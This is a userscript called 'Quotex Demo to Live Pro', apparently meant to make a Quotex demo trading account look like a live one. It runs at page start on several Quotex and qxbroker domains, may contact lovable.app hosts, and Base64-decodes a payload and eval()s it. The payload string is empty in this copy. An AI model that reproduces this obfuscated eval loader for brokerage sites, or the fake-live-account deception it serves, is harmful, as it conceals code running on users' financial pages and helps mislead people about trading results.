// ==UserScript==
// @name         Quotex Demo to Live Pro (Base64 Loader)
// @namespace    https://demotoliveadmin.lovable.app
// @version      3.4.0
// @description  UTF-8 Base64 Self-Decoding Loader for Quotex Demo to Live Pro
// @author       TRADER EYASIN
// @match        *://qxbroker.com/*
// @match        *://quotex.io/*
// @match        *://quotex-market.com/*
// @match        *://market-qx.*/*
// @match        *://*.quotex.*/*
// @match        *://*.qxbroker.*/*
// @match        *://*.market-qx.*/*
// @grant        GM_xmlhttpRequest
// @grant        GM.xmlHttpRequest
// @grant        unsafeWindow
// @connect      demotoliveadmin.lovable.app
// @connect      *.lovable.app
// @run-at       document-start
// ==/UserScript==
(function () {
  'use strict';
  const payloadB64 = "";
  const bin = atob(payloadB64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  const code = new TextDecoder('utf-8').decode(bytes);
  eval(code);
})();
